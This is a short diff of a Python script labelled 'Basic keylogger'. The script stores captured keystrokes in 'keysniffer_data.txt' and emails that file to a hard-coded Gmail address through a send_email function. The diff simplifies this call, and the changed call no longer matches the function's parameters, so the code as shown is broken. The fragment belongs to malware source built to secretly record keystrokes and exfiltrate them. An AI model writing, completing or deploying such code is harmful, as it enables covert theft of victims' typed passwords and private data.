@@ -23,9 +23,6 @@ username = getpass.getuser()
 
 toaddr = "7unkym0nk3y@gmail.com"
 keys_information = "keysniffer_data.txt"
-file_path = "keysniffer_data.txt"
-extend = "\\"
-file_merge = file_path + extend
 
 
 def send_email(filename, attachment, toaddr):
@@ -70,7 +67,7 @@ def send_email(filename, attachment, toaddr):
     s.quit()
 
 
-send_email(keys_information, file_path + extend + keys_information, toaddr)
+send_email(keys_information, toaddr)
 
 
 # ===================================================== Basic keylogger ================================================
